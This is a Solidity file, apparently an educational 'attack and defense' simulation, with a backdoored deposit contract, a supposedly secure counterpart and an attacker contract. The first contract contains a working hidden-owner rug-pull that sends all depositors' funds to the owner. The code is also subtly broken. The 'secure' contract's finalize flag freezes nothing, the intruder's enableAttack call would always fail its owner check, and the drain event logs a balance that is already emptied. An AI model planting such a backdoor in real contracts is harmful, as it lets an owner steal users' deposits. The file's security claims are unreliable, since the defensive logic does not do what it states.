// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @title HybridMalwareAttackDefense - Full Attack and Defense Simulation for Hybrid Malware in Web3 Smart Contracts
/// @author ChatGPT

/// @notice Insecure Hybrid Malware Contract (Backdoor + Drain + Behavior Shift)
contract InsecureHybridMalware {
    address public hiddenOwner;
    bool public attackEnabled;
    mapping(address => uint256) public balances;

    event Deposit(address indexed user, uint256 amount);
    event ForcedDrain(address indexed attacker, uint256 amount);

    constructor() {
        hiddenOwner = msg.sender;
    }

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    function enableAttack() external {
        require(msg.sender == hiddenOwner, "Not authorized");
        attackEnabled = true;
    }

    function withdraw(uint256 amount) external {
        if (attackEnabled) {
            payable(hiddenOwner).transfer(address(this).balance);
            emit ForcedDrain(hiddenOwner, address(this).balance);
            return;
        }
        require(balances[msg.sender] >= amount, "Insufficient balance");
        balances[msg.sender] -= amount;
        payable(msg.sender).transfer(amount);
    }

    receive() external payable {}
}

/// @notice Secure Contract with Freezing Behavior and No Hidden Attack Paths
contract SecureFrozenContract {
    address public immutable owner;
    mapping(address => uint256) public balances;
    bool public finalized = false;

    event Deposit(address indexed user, uint256 amount);
    event Withdraw(address indexed user, uint256 amount);
    event Finalized(address indexed owner);

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    modifier notFinalized() {
        require(!finalized, "Contract finalized");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function deposit() external payable {
        require(msg.value > 0, "Zero deposit");
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        balances[msg.sender] -= amount;
        payable(msg.sender).transfer(amount);
        emit Withdraw(msg.sender, amount);
    }

    function finalize() external onlyOwner notFinalized {
        finalized = true;
        emit Finalized(owner);
    }
}

/// @notice Attack contract simulating hybrid multi-layer trigger
contract HybridIntruder {
    address public targetInsecure;

    constructor(address _targetInsecure) {
        targetInsecure = _targetInsecure;
    }

    function triggerAttack() external returns (bool success) {
        (success, ) = targetInsecure.call(
            abi.encodeWithSignature("enableAttack()")
        );
    }

    function withdrawAfterAttack(uint256 amount) external returns (bool success) {
        (success, ) = targetInsecure.call(
            abi.encodeWithSignature("withdraw(uint256)", amount)
        );
    }
}
